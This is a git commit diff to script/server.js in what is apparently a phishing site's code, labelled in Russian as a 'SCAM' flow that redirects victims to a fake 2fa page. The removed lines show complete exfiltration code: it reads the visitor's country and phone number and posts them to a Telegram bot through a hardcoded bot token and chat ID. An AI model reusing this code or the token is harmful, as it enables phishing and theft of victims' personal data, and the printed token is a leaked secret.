6257cb05fa9c3308823b25f7a3d41e2c5a74fb08
Vyacheslav2123 <72310551+Vyacheslav2123@users.noreply.github.com>
2024-03-18 02:13:15 +0300

    Update server.js

--- script/server.js
+++ script/server.js
@@ -2,21 +2,5 @@ function formValidation() {
     $(document).ready(function(){
       window.location.href = '2fa.html';
     });
-    let country = document.getElementById('country').value
-    let number = document.getElementById('phone').value
-
-    let text = '✅ Пользователь (SCAM) переход на 2fa! \n\n Страна: ' + country + '\n\n Номер: ' + number
-
-    const TOKEN = '5669061761:AAE_0WY6mXMdEXVp48HVTDcdWecCoqvxzNI'; // токен
-    const CHAT_ID = '-4143985214'; 
     
-    otpravka(TOKEN,text,CHAT_ID);
- 
-    function otpravka(TOKEN,text,CHAT_ID){
-      var z=$.ajax({  
-      type: "POST",  
-      url: "https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CHAT_ID,
-      data: "parse_mode=HTML&text="+encodeURIComponent(text), 
-      }); 
-    };      
 }
